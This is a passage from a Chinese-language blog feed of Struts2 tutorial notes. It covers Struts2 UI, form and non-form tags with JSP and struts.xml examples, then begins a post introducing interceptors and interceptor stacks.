class="string">"editGadget"</span>&gt;</span><br><span class="line">    &lt;s:param name=<span class="string">"id"</span> value=<span class="string">"%&#123;selected&#125;"</span> /&gt;</span><br><span class="line">&lt;/s:url&gt;</span><br><span class="line"></span><br><span class="line">&lt;-- Example <span class="number">3</span>--&gt;</span><br><span class="line">&lt;s:url includeParams=<span class="string">"get"</span>&gt;</span><br><span class="line">    &lt;s:param name=<span class="string">"id"</span> value=<span class="string">"%&#123;'22'&#125;"</span> /&gt;</span><br><span class="line">&lt;/s:url&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_url_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_url_tag.html</a></p><h3 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h3><p><code>&lt;s:a&gt;</code> 标签与 HTML 中的 <code>&lt;a&gt;</code> 标签类似，主要用于构造 HTML 页面中的超链接。<code>&lt;s:a&gt;</code> 标签的属性及相关说明如表所示。</p><p><img src="/2020/05/01/Struts2基础篇之标签/3.png" alt=""></p><p><code>&lt;s:a&gt;</code> 标签的使用格式如下所示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:a href="链接地址"&gt;&lt;/s:a&gt;</span><br><span class="line">&lt;s:a namespace="" action=""&gt;www.baidu.com&lt;/s:a&gt;</span><br></pre></td></tr></table></figure><h3 id="debug标签"><a href="#debug标签" class="headerlink" title="debug标签"></a>debug标签</h3><p><code>&lt;s:debug&gt;</code> 标签用于输出服务端对象（如 request、application、ValueStack 等）中的信息，该标签可用于辅助调试 Java Web 程序。</p><p><code>&lt;s:debug&gt;</code> 标签只有一个 id 属性，表示 <code>&lt;s:debug&gt;</code> 标签的一个引用，通常不使用该属性。在使用 <code>&lt;s:debug&gt;</code>标签后，网页中会生成一个 Debug 的链接，单击该链接，网页中将输出各种服务器对象的信息，如图所示。</p><p><img src="/2020/05/01/Struts2基础篇之标签/4.png" alt=""></p><h2 id="0x04-表单标签"><a href="#0x04-表单标签" class="headerlink" title="0x04 表单标签"></a>0x04 表单标签</h2><p>表单标签列表是Struts UI标签的子集。Struts2 的表单标签用于向服务器提交用户输入的信息，绝大多数的表单标签都有其对应的 HTML 标签。</p><h3 id="Struts2的模板和主题"><a href="#Struts2的模板和主题" class="headerlink" title="Struts2的模板和主题"></a>Struts2的模板和主题</h3><p>Struts2 的 UI 标签都是基于模板和主题的。模板就是一些代码，Struts2 标签使用这些代码渲染生成相应的 HTML 代码。模板是一个 UI 标签的外在表现形式，并且每个标签都会有自己对应的模板。如果为所有的 UI 标签提供样式和视觉效果相似的模板，那么这一系列的模板就形成了一个主题。</p><p>Struts2 默认提供了四种主题，分别为 simple、xhtml、css_xhtml 和 Ajax，这四种主题的作用如下表所示。</p><table><thead><tr><th>名称</th><th>作用</th></tr></thead><tbody><tr><td>simple 主题</td><td>这是最简单的主题，使用该主题时，每个 UI 标签只生成最基本的 HTML 元素，没有任何附加功能。</td></tr><tr><td>xhtml 主题</td><td>这是 Struts2 的默认主题，它对 simple 主题进行了扩展，提供了布局功能、Label 显示名称以及与验证框架和国际化框架的集成。</td></tr><tr><td>css_xhtml</td><td>该主题是对 xhtml 的扩展，在 xhtml 的基础之上添加对 CSS 的支持和控制。</td></tr><tr><td>Ajax</td><td>继承自 xhtml，提供 Ajax 支持。</td></tr></tbody></table><p>在上述四种主题中，xhtml 是默认主题，但它有一定的局限性，因为它使用表格进行布局，并且只支持每一行放一个表单项，一旦遇到复杂的页面布局，xhtml 就不再适用了。此时，就需要改变 Struts2 的默认主题。</p><p>通常情况下，可以通过设置常量 struts.ui.theme 改变默认主题，具体方法是在 struts.xml 文件中增加相应的配置。例如想要使用 simple 的主题，那么只需要在 struts.xml 中增加如下配置即可。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.ui.theme"</span> <span class="attr">value</span>=<span class="string">"simple"</span>/&gt;</span></span><br></pre></td></tr></table></figure><h3 id="表单标签的公共属性"><a href="#表单标签的公共属性" class="headerlink" title="表单标签的公共属性"></a>表单标签的公共属性</h3><p>每一个表单标签在 Struts2 核心 JAR 文件的 org.apache.struts2.components 包中都有一个对应的类，这些对应的类都继承自 UIBean 类。</p><p>UIBean 类提供了一组公共属性，这些属性是所有表单标签的通用属性，具体如表所示。</p><table><thead><tr><th>属性名</th><th>主题</th><th>数据类型</th><th>说   明</th></tr></thead><tbody><tr><td>title</td><td>simple</td><td>String</td><td>设置表单元素的 title 属性</td></tr><tr><td>disabled</td><td>simple</td><td>String</td><td>设置表单元素是否可用</td></tr><tr><td>label</td><td>xhtml</td><td>String</td><td>设置表单元素的 label 属性</td></tr><tr><td>labelPosition</td><td>xhtml</td><td>String</td><td>设置 label 元素的显示位置，可选值为 top 和 left（默认）</td></tr><tr><td>name</td><td>simple</td><td>String</td><td>设置表单元素的 name 属性，与 Action 中的属性名对应</td></tr><tr><td>value</td><td>simple</td><td>String</td><td>设置表单元素的值</td></tr><tr><td>cssClass</td><td>simple</td><td>String</td><td>设置表单元素的 class</td></tr><tr><td>cssStyle</td><td>simple</td><td>String</td><td>设置表单元素的 style 属性</td></tr><tr><td>required</td><td>xhtml</td><td>Boolean</td><td>设置表单元素为必填项</td></tr><tr><td>requiredposition</td><td>xhtml</td><td>String</td><td>设置必填标记（默认为*）相对于 label 元素的位置，可选值为 left 和 right（默认）</td></tr><tr><td>tabindex</td><td>simple</td><td>String</td><td>设置表单元素的 tabindex 属性</td></tr></tbody></table><p>需要注意的是，表单标签的 name 和 value 属性基本等同于 HTML 组件的 name 和 value，但也有所不同：表单标签在生成 HTML 时，如果标签没有设置 value 属性，则会从值栈中按照 name 获取相应的值，并把这个值设置成 HTML 组件的 value。</p><p>简单而言，就是表单标签的 value 在生成 HTML 时会自动设置值，而这个值是从值栈中获取的。  </p><h3 id="form标签"><a href="#form标签" class="headerlink" title="form标签"></a>form标签</h3><p>form标签用于呈现 HTML 语言中的表单元素，其常用属性如表所示。</p><table><thead><tr><th>属性名</th><th>是否必填</th><th>类  型</th><th>说  明</th></tr></thead><tbody><tr><td>action</td><td>否</td><td>String</td><td>指定提交时对应的 action，不需要 action 后缀</td></tr><tr><td>enctype</td><td>否</td><td>String</td><td>HTML 表单 enctype 属性</td></tr><tr><td>method</td><td>否</td><td>String</td><td>HTML 表单 method 属性</td></tr><tr><td>namespace</td><td>否</td><td>String</td><td>所提交 action 的命名空间</td></tr></tbody></table><p>在使用form标签时，一般会包含其他的表单元素，如 textfield和radio等标签。在提交表单时，这些表单元素对应的 name 属性，将其作为参数传入 Struts2 框架进行处理。</p><h3 id="textfield和textarea标签"><a href="#textfield和textarea标签" class="headerlink" title="textfield和textarea标签"></a>textfield和textarea标签</h3><p>textfield和 textarea标签的作用比较相似，都用于创建文本框，其主要区别在于textfield创建的是单行文本框，而textarea创建的是多行文本框。二者的使用也比较简单，一般只需要指定其 label 和 name 属性即可。两个标签的用法如下所示。</p><p>textfield标签的用法：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:textfield label=<span class="string">"用户名"</span> name=<span class="string">"username"</span>/&gt;</span><br></pre></td></tr></table></figure><p>textarea标签的用法：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:textarea label=<span class="string">"描述"</span> name=<span class="string">"description"</span>/&gt;</span><br></pre></td></tr></table></figure><p>在上述两个用法中，name 属性用于指定单行/多行文本框的名称，在 Action 中，通过 name 属性即可获取单行/多行文本框的值。</p><p>此外，textarea标签还可以通过 value 属性指定单行/多行文本框的当前值，通过 cols 和 rows 属性分别指定多行文本框的列数和行数。</p><p>passWord标签</p><p>password标签用于创建一个密码输入框，它可以生成 HTML 中的 <code>&lt;input type=&quot;password&quot;/&gt;</code> 标签。</p><p>password标签的常用属性说明如表所示。</p><p><img src="/2020/05/01/Struts2基础篇之标签/7.png" alt=""></p><p>password标签的使用方法如下所示：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:password label=<span class="string">"password"</span> name=<span class="string">"password"</span> maxlength=<span class="string">"20"</span>/&gt;</span><br></pre></td></tr></table></figure><p>需要注意的是，Struts2 的 password 标签与 HTML 的 <code>input type=&quot;password&quot;/&gt;</code> 标签也略有不同：<code>&lt;input type=&quot;password&quot;/&gt;</code> 标签只要设置 value 属性就可以将 value 的属性值作为默认显示值；而 Struts2 的 password 标签除了要设置 value 属性值以外，还要设置 showPassword 属性值为 true。</p><h3 id="radio标签"><a href="#radio标签" class="headerlink" title="radio标签"></a>radio标签</h3><p>radio标签用于创建单选按钮，生成 HTML 中的 <code>&lt;input type=&quot;radio&quot;/&gt;</code> 标签。radio 标签的常用属性说明如表所示。</p><table><thead><tr><th>属性名</th><th>是否必填</th><th>类  型</th><th>说  明</th></tr></thead><tbody><tr><td>list</td><td>是</td><td>Collection，Map Enmumeration，Iterator，Array</td><td>用于生成单选框中的集合</td></tr><tr><td>listKey</td><td>否</td><td>String</td><td>指定集合对象中的哪个属性作为选项的 value</td></tr><tr><td>listValue</td><td>否</td><td>String</td><td>指定集合对象中的哪个属性作为选项的内容</td></tr></tbody></table><p>表中的三个属性必须要配合使用，由 list 属性指定从集合中获得元素，由 listKey 属性指定获得元素之后使用元素的哪个属性作为生成 <code>&lt;input type=&quot;radio&quot;/&gt;</code> 的 value 属性，由 listValue 属性指定生成的 <code>&lt;input type=&quot;radio&quot;/&gt;</code> 后展示给用户的内容。</p><h3 id="reset标签"><a href="#reset标签" class="headerlink" title="reset标签"></a>reset标签</h3><p>reset标签用于创建一个重置按钮，会生成 HTML 中的 <code>&lt;input type=&quot;reset&quot;/&gt;</code> 标签，该标签的使用比较简单，其常用属性为 name 和 value。</p><p>其中，name 属性用于指定重置按钮的名称，在 Action 中，可以通过 name 属性获取重置按钮的值，value 属性用于显示按钮的值。该标签的用法如下所示：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:reset value=<span class="string">"reset"</span>/&gt;</span><br><span class="line">&lt;s:reset name=<span class="string">"reset"</span> value=<span class="string">"重置"</span>/&gt;</span><br></pre></td></tr></table></figure><h3 id="submit标签"><a href="#submit标签" class="headerlink" title="submit标签"></a>submit标签</h3><p>submit标签主要用于产生 HTML 中的提交按钮，该表单元素中，可以指定提交时的 Action 对应的方法。该标签通常与 form 标签一起使用，该标签的常用属性如表所示。</p><p><img src="/2020/05/01/Struts2基础篇之标签/8.png" alt=""></p><p>checkboxlist标签</p><p>checkboxlist标签用于一次性创建多个复选框，用户可以选择创建零到多个复选框，它可以产生一组<code>&lt;input type=&quot;checkbox&quot;/&gt;</code>标签。</p><p>checkboxlist标签的常用属性及其说明如表所示。</p><p><img src="/2020/05/01/Struts2基础篇之标签/9.png" alt=""></p><p>在表的属性中，listKey 和 listValue 属性主要用于集合中，通常存放的是 JavaBean，可以使用这两个属性从 JavaBean 的众多属性中筛选需要的值。</p><h3 id="select标签"><a href="#select标签" class="headerlink" title="select标签"></a>select标签</h3><p>select标签用于创建一个下拉列表框，它会生成 HTML 中的 <code>&lt;select&gt;</code> 标签。select标签的常用属性及其说明如表所示。</p><p><img src="/2020/05/01/Struts2基础篇之标签/10.png" alt=""></p><p>在表的属性中，headerKey 和 headerValue 属性需要同时使用，使用时会在所有的真实选项之前加添一项作为标题项。如选择城市时，可以在所有的具体城市之前添加一项“请选择”，这一项不会作为备选的值。</p><p>size 属性可以让下拉框同时显示多个值，multiple 属性让用户同时选择多个值，只是在后台的 Action 接收下拉框值时，不能使用 String 类型，而是使用 <code>String[]</code> 或者 <code>List&lt;String&gt;</code>。</p><h3 id="optgroup标签"><a href="#optgroup标签" class="headerlink" title="optgroup标签"></a>optgroup标签</h3><p>optgroup标签用于生成选项组，通常作为 select 标签的子标签使用。由于在一个下拉列表框中可以包含多个选项组，所以 select 标签也能够包含多个 optgroup 标签。</p><p>使用 optgroup 标签时，也需要指定该标签的 list、listKey、listValue 等属性，这些属性的含义与 select 标签的相应属性含义相同。此外，optgroup 标签的 label 属性表示选项组的组名，选项组的组名是不能被选中的。</p><h3 id="file标签"><a href="#file标签" class="headerlink" title="file标签"></a>file标签</h3><p>file标签用于创建一个文件选择框，它会生成 HTML 中的 <code>&lt;input type=&quot;file&quot;/&gt;</code> 标签。该标签常用的属性及其说明如表所示。</p><p><img src="/2020/05/01/Struts2基础篇之标签/11.png" alt=""></p><p>file标签的一般用法如下所示：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:file name=<span class="string">"uploadFile"</span> accept=<span class="string">"text/*"</span>/&gt;</span><br><span class="line">&lt;s:file name=<span class="string">"otherUploadFile"</span> accept=<span class="string">"text/html,text/plain"</span>/&gt;</span><br></pre></td></tr></table></figure><h3 id="hidden标签"><a href="#hidden标签" class="headerlink" title="hidden标签"></a>hidden标签</h3><p>hidden标签用于创建隐藏表单元素，它会生成 HTML 中的隐藏域标签 <code>&lt;input type=&quot;hidden&quot;/&gt;</code>。该标签在页面上没有任何显示，可用于保存或交换数据，如需要提交表单时，要传递一个值到请求参数中，就可以使用该标签。</p><p>该标签的使用非常简单，通常只需要设置 name 和 value 属性即可，其使用语法如下所示：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:hidden name=<span class="string">"id"</span> value=<span class="string">"%&#123;id&#125;"</span>/&gt;</span><br></pre></td></tr></table></figure><h2 id="0x05-非表单标签"><a href="#0x05-非表单标签" class="headerlink" title="0x05 非表单标签"></a>0x05 非表单标签</h2><p>Struts2 的非表单标签主要用于在页面中生成非表单的可视化元素，以及输出在 Action 中封装的信息，如输出错误提示信息等。</p><p>常用的非表单标签有 <code>&lt;s:actionmessage&gt;</code>、<code>&lt;s:actionerror&gt;</code> 和 <code>&lt;s:fielderror&gt;</code> 标签，它们分别用于显示动作信息、动作错误信息和字段错误信息。如果信息为空，则不显示。各标签的具体功能介绍如下。</p><ul><li><code>&lt;s:actionmessage&gt;</code> 标签：如果 Action 实例的 getActionMessage() 方法返回不为 null，则该标签负责输出该方法返回的系列消息。</li><li><code>&lt;s:actionerror&gt;</code> 标签：如果 Action 实例的 getActionError() 方法返回不为 null，则该标签负责输出该方法返回的系列错误。</li><li><code>&lt;s:fielderror&gt;</code> 标签：如果 Action 实例存在表单域的类型转换错误和校验错误，则该标签负责输出这些错误提示。</li></ul><h3 id="Demo-2"><a href="#Demo-2" class="headerlink" title="Demo"></a>Demo</h3><p>新建MsgAction类，分别使用了addActionMessage、addActionError 和 addFieldError 三个方法输出错误信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MsgAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.addActionMessage(<span class="string">"&lt;s:actionmessage&gt;标签输出的内容"</span>);</span><br><span class="line">        <span class="keyword">this</span>.addActionError(<span class="string">"&lt;s:actionerror&gt;标签输出的内容"</span>);</span><br><span class="line">        <span class="keyword">this</span>.addFieldError(<span class="string">"msg"</span>, <span class="string">"&lt;s:fielderror&gt;标签输出的内容"</span>);</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建non_formTags.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;errorTags&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;s:actionmessage/&gt;</span><br><span class="line">&lt;s:actionerror/&gt;</span><br><span class="line">&lt;s:fielderror/&gt;</span><br><span class="line">&lt;s:fielderror value=<span class="string">"msg"</span>/&gt;&lt;!-- 有无value效果一样 --&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>修改struts.xml文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"</span></span><br><span class="line"><span class="meta">        "http://struts.apache.org/dtds/struts-2.3.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.devMode"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"helloworld"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"msg"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.action.MsgAction"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span>&gt;</span>/non_formTags.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="/2020/05/01/Struts2基础篇之标签/6.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/categories/Java/Struts2/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>Struts2基础篇之Interceptor（拦截器）</title>
    <link href="https://www.mi1k7ea.com/2020/05/01/Struts2%E5%9F%BA%E7%A1%80%E7%AF%87%E4%B9%8BInterceptor%EF%BC%88%E6%8B%A6%E6%88%AA%E5%99%A8%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2020/05/01/Struts2基础篇之Interceptor（拦截器）/</id>
    <published>2020-04-30T16:00:03.000Z</published>
    <updated>2020-08-15T06:40:31.808Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>本笔记直接参考或引自如下链接文章：</p><p><a href="http://c.biancheng.net/struts2/" target="_blank" rel="noopener">http://c.biancheng.net/struts2/</a></p><p><a href="https://www.w3cschool.cn/struts_2/" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/</a></p><h2 id="0x01-Interceptor简介"><a href="#0x01-Interceptor简介" class="headerlink" title="0x01 Interceptor简介"></a>0x01 Interceptor简介</h2><p>Interceptor即拦截器。</p><p>在 Struts2 框架中，拦截器是其重要的组成部分，Struts2 的很多功能（数据校验、对象类型转换、文件上传等）都是构建在拦截器之上的。</p><p>通常情况下，开发者通过 Struts2 内建的拦截器可以完成大部分的操作，只有在内建拦截器不能满足需求时，才会自己扩展。可以这么说，Struts2 框架的简单易用，与拦截器的作用是分不开的。</p><p>拦截器（Interceptor）是 Struts2 框架的核心组成部分，它类似于 Servlet 中的过滤器，是一种可以在请求之前或之后执行的 Struts2 的组件，也可以将其理解为动态拦截 Action 调用的对象。</p><p>在早期的 MVC 框架中，通常会将一些通用的操作（如类型转换、数据校验、解析上传的文件等）强制写在控制器中，而这些常用操作又不是所有的请求都需要实现的，这就导致了框架的灵活性不足、可扩展性低等问题。</p><p>在 Struts2 框架中，这些通用的核心功能都放到了拦截器中实现，而不是集中放在核心控制器中实现。</p><p>由于框架中各个功能对应的拦截器是分开定义的，每个拦截器都可以完成单个功能，并且可以自由选择、灵活组合，而需要哪些拦截器时，只要在 struts.xml 配置文件中指定即可，所以 Struts2 框架的使用十分灵活。同时，由于在 Struts2 框架中支持自定义拦截器，所以其扩展性十分强大。</p><p>当多个拦截器组合在一起时就形成了拦截器链（Interceptor Chain）或拦截器栈（Interceptor Stack）。</p><p>拦截器链就是指对应各个功能的拦截器按照一定的顺序排列在一起形成的链，而拦截器链组成的集合就是拦截器栈。当有适配连接器栈的访问请求进来时，这些拦截器就会按照之前定义的顺序被调用。</p><p>在通常情况下，拦截器都是以代理方式调用的，它在一个 Action 执行前后进行拦截，围绕着 Action 和 Result 的执行而执行，其工作方式如图下所示。</p><p>从图下中可以看出，Struts2 拦截器的实现原理与 Servlet 过滤器的实现原理类似，它以链式执行，对真正要执行的方法（execute()）进行拦截。</p><p><img src="/2020/05/01/Struts2基础篇之Interceptor（拦截器）/4.png" alt=""></p><p>在执行 Action 的 execute() 方法之前会执行一次拦截，在 Action 和 Result 执行之后，拦截器会再次执行（与先前的调用顺序相反）。在此链式执行的过程中，每一个拦截器都可以直接返回，从而终止余下的拦截器、Action 及 Result 的执行。</p><h2 id="0x02-Interceptor的配置和使用"><a href="#0x02-Interceptor的配置和使用" class="headerlink" title="0x02 Interceptor的配置和使用"></a>0x02 Interceptor的配置和使用</h2><h3 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h3><p>要使用拦截器，首先要对它进行配置。拦截器的配置是在 struts.xml 文件中完成的，它通常以 <code>&lt;interceptor&gt;</code> 标签开头，以 <code>&lt;/interceptor&gt;</code> 标签结束。定义拦截器的语法格式如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"interceptorName"</span> <span class="attr">class</span>=<span class="string">"interceptorClass"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"paramName"</span>&gt;</span>paramValue<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">interceptor</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述语法格式中，<code>&lt;interceptor&gt;</code> 元素的 name 属性用于指定拦截器的名称，class 属性用于指定拦截器的实现类。有时，在定义拦截器时需要传入参数，这时需要使用 <code>&lt;param&gt;</code> 标签，其中 name 属性用于指定参数的名称，paramValue 表示参数的值。</p><h3 id="拦截器栈"><a href="#拦截器栈" class="headerlink" title="拦截器栈"></a>拦截器栈</h3><p>在实际的项目开发中，经常需要在 Action 执行之前执行多个拦截动作，如登录日志记录、权限管理等。</p><p>为了方便代码管理和程序的执行，开发者通常会将这些拦截器组成一个拦截器栈，在使用时，可以将栈内的多个拦截器当成一个整体引用。当拦截器栈被附加到一个 Action 上时，在执行 Action 之前必须先执行拦截器栈中的每一个拦截器。</p><p>定义拦截器栈使用 <code>&lt;interceptors&gt;</code> 元素和 <code>&lt;interceptor-stack&gt;</code> 子元素，当配置多个拦截器时，需要使用 <code>&lt;interceptor-ref&gt;</code> 元素指定多个拦截器，配置语法如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">"interceptorStackName"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"interceptorName"</span>/&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述语法中，interceptorStackName 值表示配置的拦截器栈的名称；interceptorName 值表示拦截器的名称。除此之外，在一个拦截器栈中还可以包含另一个拦截器栈，示例代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"default"</span> <span class="attr">namespace</span>=<span class="string">"/"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--声明拦截器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"interceptor1"</span> <span class="attr">class</span>=<span class="string">"interceptorClass"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"interceptor2"</span> <span class="attr">class</span>=<span class="string">"interceptorClass"</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--定义一个拦截器栈myStack，该拦截器栈中包含两个拦截器和一个拦截器栈--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">"myStack"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"defaultStack"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"interceptor1"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"interceptor2"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述代码中，定义的拦截器栈的名称是 myStack，在 myStack 栈中，除了引用了两个自定义的拦截器 interceptor1 和 interceptor2 以外，还引用了一个内置拦截器栈 defaultStack，这个拦截器是必须要引入的。</p><h3 id="默认拦截器"><a href="#默认拦截器" class="headerlink" title="默认拦截器"></a>默认拦截器</h3><p>如果想对一个包下的 Action 使用相同的拦截器，则需要为该包中的每个 Action 都重复指定同一个拦截器，这样写显然过于繁琐。为了解决此问题，Struts2 中支持使用默认拦截器，它可以对其指定的包中的所有 Action 都起到拦截作用。</p><p>一旦为某一个包指定了默认拦截器，并且该包中的 Action 